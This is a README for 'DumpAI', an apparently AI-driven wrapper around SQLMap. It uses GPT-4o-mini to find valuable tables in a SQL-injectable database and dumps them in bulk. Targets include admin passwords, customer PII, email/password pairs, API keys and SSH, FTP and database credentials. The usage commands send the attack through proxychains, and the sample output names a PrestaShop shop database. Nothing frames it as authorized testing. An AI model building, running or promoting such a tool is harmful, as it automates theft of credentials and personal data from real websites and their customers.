# DumpAI v2.0

AI-Powered Autonomous SQLMap Data Extractor

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                     DumpAI Agent                            │
├─────────────────────────────────────────────────────────────┤
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐ │
│  │   Memory    │  │   Tools     │  │   AI (GPT-4o-mini)  │ │
│  │  - History  │  │  - Enum     │  │  - Schema Analysis  │ │
│  │  - State    │  │  - Dump     │  │  - Column Mapping   │ │
│  │  - Cache    │  │  - Analyze  │  │  - CMS Detection    │ │
│  └─────────────┘  └─────────────┘  └─────────────────────┘ │
│                           │                                 │
│                           ▼                                 │
│  ┌─────────────────────────────────────────────────────┐   │
│  │              Agent Loop                              │   │
│  │  1. Enumerate tables                                 │   │
│  │  2. AI analyze schema → identify targets             │   │
│  │  3. Get columns for each target table                │   │
│  │  4. AI analyze columns → categorize                  │   │
│  │  5. Parallel dump by category                        │   │
│  │  6. Save to dump_all.json                            │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

## Categories

| Category | Description |
|----------|-------------|
| `user_data` | Admin/employee accounts, passwords, tokens, sessions |
| `customer_data` | Customer PII (names, addresses, phones, emails) |
| `email_pass` | Email + password/hash pairs only |
| `api_key` | API keys, secrets, OAuth tokens |
| `sys_data` | System access (DB creds, phpMyAdmin, FTP, SSH) |

## Usage

```bash
# Extract admin data and system credentials
python3 dumpai.py -c "proxychains4 -q python3 sqlmap.py -r req.txt -p id" --user-data --sys-data

# Extract everything
python3 dumpai.py -c "proxychains4 -q python3 sqlmap.py -r req.txt -p id" --all

# Only email+password pairs
python3 dumpai.py -c "proxychains4 -q python3 sqlmap.py -r req.txt -p id" --email-pass
```

## Output

Single file: `dumpai_out/dump_all.json`

```json
{
  "meta": {
    "session_id": "20241213_120000",
    "database": "shop_db",
    "cms": "PrestaShop",
    "duration": 125.5,
    "tables_processed": 8,
    "rows_extracted": 1250
  },
  "data": {
    "user_data": [...],
    "customer_data": [...],
    "email_pass": [...],
    "api_key": [...],
    "sys_data": [...]
  },
  "summary": {...}
}
```

## Features

- **Tool Abstraction**: Each action is a separate tool
- **Memory System**: Full history and state tracking
- **AI Analysis**: GPT-4o-mini for schema/column analysis
- **CMS Detection**: PrestaShop, WordPress, Magento, etc.
- **Parallel Extraction**: ThreadPoolExecutor for speed
- **Single Output File**: All data in dump_all.json
- **Session Persistence**: Save/resume capability

## Files

```
dumpai/
├── dumpai.py      # CLI entry point
├── agent.py       # Main agent logic
├── memory.py      # State management
├── tools/
│   ├── base.py    # BaseTool class
│   ├── enumerate.py # DB/table/column enumeration
│   ├── dump.py    # Data dumping
│   └── analyze.py # AI analysis tools
└── README.md
```

## Requirements

- Python 3.8+
- SQLMap installed
- OPENAI_API_KEY environment variable
